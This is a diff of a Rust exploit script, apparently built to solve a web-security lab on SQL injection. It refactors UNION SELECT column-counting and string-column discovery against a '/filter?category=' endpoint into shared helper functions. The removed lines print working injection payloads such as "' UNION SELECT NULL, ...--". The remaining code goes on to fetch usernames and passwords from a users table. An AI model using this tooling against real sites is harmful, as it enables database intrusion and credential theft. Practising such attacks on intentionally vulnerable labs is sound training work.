@@ -1,9 +1,8 @@
 use scraper::{Html, Selector};
 use sql_injection::{
-    HTTP_CLIENT, LOGIN_CSRF_TOKEN_SELECTOR, check_is_lab_solved, generate_clap_parser,
-    get_csrf_token,
+    HTTP_CLIENT, LOGIN_CSRF_TOKEN_SELECTOR, check_is_lab_solved, find_columns_of_type_string,
+    find_no_of_columns, generate_clap_parser, get_csrf_token,
 };
-use std::iter::repeat_n;
 use std::{collections::HashMap, sync::LazyLock};
 
 static TABLE_TH_SELECTOR: LazyLock<Selector> = LazyLock::new(|| {
@@ -19,81 +18,11 @@ fn main() {
 
     let lab_url = args.lab_url.as_str().trim_end_matches("/");
 
-    logger::info("Determining the number of columns using UNION SELECT...");
+    let lab_url_with_endpoint = format!("{lab_url}/filter?category=");
 
-    let mut columns = 1;
+    let columns = find_no_of_columns(&lab_url_with_endpoint, None);
 
-    loop {
-        let payload = repeat_n("NULL", columns).collect::<Vec<&str>>().join(", ");
-        let query = format!("' UNION SELECT {}--", payload);
-
-        logger::info(
-            format!(
-                "Making query {}: {}/filter?category={}",
-                columns, lab_url, query
-            )
-            .as_ref(),
-        );
-
-        if HTTP_CLIENT
-            .get(format!("{}/filter?category={}", lab_url, query))
-            .send()
-            .expect("[-] Failed to make a GET request")
-            .status()
-            == 200
-        {
-            break;
-        } else {
-            columns += 1;
-        }
-    }
-
-    logger::success(
-        format!(
-            "The number of columns found using UNION SELECT is {}",
-            columns
-        )
-        .as_ref(),
-    );
-
-    logger::info("Finding columns that contain text...");
-
-    let mut target_columns: Vec<usize> = Vec::new();
-
-    for i in 0..columns {
-        let payload = (0..columns)
-            .map(|column| if column == i { "'string'" } else { "NULL" })
-            .collect::<Vec<&str>>()
-            .join(", ");
-
-        let query = format!("' UNION SELECT {}--", payload);
-
-        logger::info(format!("Making query {}: {}/filter?category={}", i, lab_url, query).as_ref());
-
-        if HTTP_CLIENT
-            .get(format!("{}/filter?category={}", lab_url, query))
-            .send()
-            .expect("[-] ")
-            .status()
-            == 200
-        {
-            target_columns.push(i);
-        } else {
-            continue;
-        }
-    }
-
-    logger::success(
-        format!(
-            "The columns containing text are: {} (Index starts from 0!)",
-            target_columns
-                .iter()
-                .map(|e| e.to_string())
-                .collect::<Vec<String>>()
-                .join(", ")
-        )
-        .as_ref(),
-    );
+    find_columns_of_type_string(&lab_url_with_endpoint, columns, None);
 
     logger::info("Fetching the `username` and `password` columns from `users` table");
     logger::info(
